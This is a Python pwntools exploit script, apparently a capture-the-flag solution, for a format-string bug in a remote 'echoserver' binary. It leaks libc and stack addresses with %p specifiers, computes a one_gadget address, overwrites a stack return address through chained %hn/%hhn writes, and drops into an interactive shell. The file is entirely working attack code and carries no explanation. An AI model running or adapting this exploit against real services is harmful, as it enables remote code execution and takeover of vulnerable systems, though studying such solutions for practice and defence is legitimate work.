from pwn import *
import sys
import os

remote_ip,port = 'echoserver.darkarmy.xyz','32768'
binary = 'server'
brkpts = '''
b*0x555555554a13
b*0x555555554a18
'''

context(arch="amd64", os="linux", terminal=['tmux', 'splitw', '-h'])
if len(sys.argv)>1:
    io = remote(remote_ip,port)

else:
    io = process(binary, env={'LD_PRELOAD':'./libc.so.6'})

re = lambda a: io.recv(a)
ru = lambda a: io.recvuntil(a)
rl = lambda  : io.recvline()
s  = lambda a: io.send(a)
sl = lambda a: io.sendline(a)
sla= lambda a,b: io.sendlineafter(a,b)
sa = lambda a,b: io.sendafter(a,b)

if __name__== "__main__":

    gadget = 0x4f365

    #gdb.attach(io,brkpts)

    payload1 = "%81d" + "%c"*7 + "%hhn" + "aa" + "%7$hhn" + "%17$p" + "%14$p"

    sla('> ',payload1)
    ru('aa')
    lsm = re(14).decode()
    stack = re(14).decode()

    stack = int(stack,16)

    leak = int(lsm,16)-0x21b97
    gadget = gadget + leak
    lsm = int(lsm,16)
    log.info("Libc  : {}".format(hex(lsm)))
    log.info("One   : {}".format(hex(gadget)))
    log.info("Stack : {}".format(hex(stack)))


    newstack = stack - 216
    off = gadget &0xffff

    byte =(  gadget & 0xff0000 ) >> 16
    word = gadget & 0xffff
    #stacklibc = (stack-0xd8)
    second_off = 0xed78 - 81 - 7 - 8

    payload1 = "%81d" + "%c"*7 + "%hhn" + "aa" + "%7$hhn" + "%17$p" + "%14$p"
    second_off = (newstack & 0xffff) - 81 - 7 - 17 - 14 + 1
    payload1 += "%{}d".format(second_off) + "%19$hn"
    sla('> ',payload1)

    payload2 = "%115d"+"%c"*7+"%hhn" #  writing first offset

    leftover = word - 115 - 7

    payload2 += "%{}d".format(leftover)
    payload2 += '%45$hn' # finish off the write

    last = word & 0xff
    if last > byte:
        leftover = (0xff - last) + byte + 1
    else:
        leftover = last - byte

    payload2 += "%{}d".format(leftover)
    payload2 += '%7$hhn' # finish off the write

    print(len(payload2))
    sla('> ',payload2)
    io.read(10000)
    io.interactive()